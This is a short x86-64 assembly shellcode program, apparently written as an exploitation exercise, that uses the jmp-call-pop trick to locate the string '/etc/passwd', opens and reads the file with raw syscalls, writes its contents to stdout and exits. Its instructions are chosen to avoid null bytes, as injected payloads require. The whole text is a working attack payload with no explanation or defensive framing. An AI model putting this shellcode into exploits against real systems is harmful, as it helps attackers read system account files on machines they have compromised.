global _start

section .text

_start:
	jmp _push_filename

	_readfile:
	
	pop rdi 						; rdi contains the addr to /etc/passwd
	xor rsi, rsi
	push rsi

	push   0x2						; xor rax, rax
	pop    rax						; add al, 2
	syscall							; Syscall open (0x02)

	sub sp, 0xfff
	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov rax, rdx
	mov dx, 0xfff 					; size to read
	syscall 						; Syscall read (0x00)

	; syscall write to stdout
	xor rdi, rdi
	inc edi
	mov rdx, rax
	mov rax, rdi
	syscall

	; syscall exit
	xor rax, rax
	mov al, 60
	syscall

	_push_filename:
	call _readfile
	path: db "/etc/passwd"
